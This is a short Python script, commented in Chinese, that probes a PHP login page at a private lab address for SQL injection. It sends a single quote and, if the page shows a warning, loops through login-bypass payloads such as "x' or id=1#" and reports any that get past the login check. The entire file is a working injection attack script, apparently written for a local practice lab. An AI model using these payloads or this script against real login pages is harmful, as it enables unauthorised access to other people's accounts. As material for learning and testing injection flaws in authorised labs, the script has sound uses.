import requests


# 利用python对PHP的登录页面进行Fuzz测试

def login_fuzz():
    # 先使用单引号进行试探
    url = 'http://192.168.2.128/Security/login.php'
    data = {'username': "'", 'password': '21343', 'vcode': '0000'}
    resp = requests.post(url=url, data=data)
    # print(resp.text)

    if 'Warning' in resp.text:
        print("本登录功能可能存在SQL注入漏洞，可以一试")
        # 如果单引号存在利用嫌疑，则继续利用
        payload_list = ["x' or id=1#", "x' or uid=1#", "x' or userid=1#", "x' or userid=2#", "'or userid=1"]
        for payload in payload_list:
            data = {'username': payload, 'password': '21343', 'vcode': '0000'}
            resp = requests.post(url=url, data=data)
            if "login-fail" not in resp.text:
                print(f'登录成功，payload为：{data}')
    else:
        print("通过试探，发现登录后台页面对单引号不敏感")


if __name__ == '__main__':
    login_fuzz()
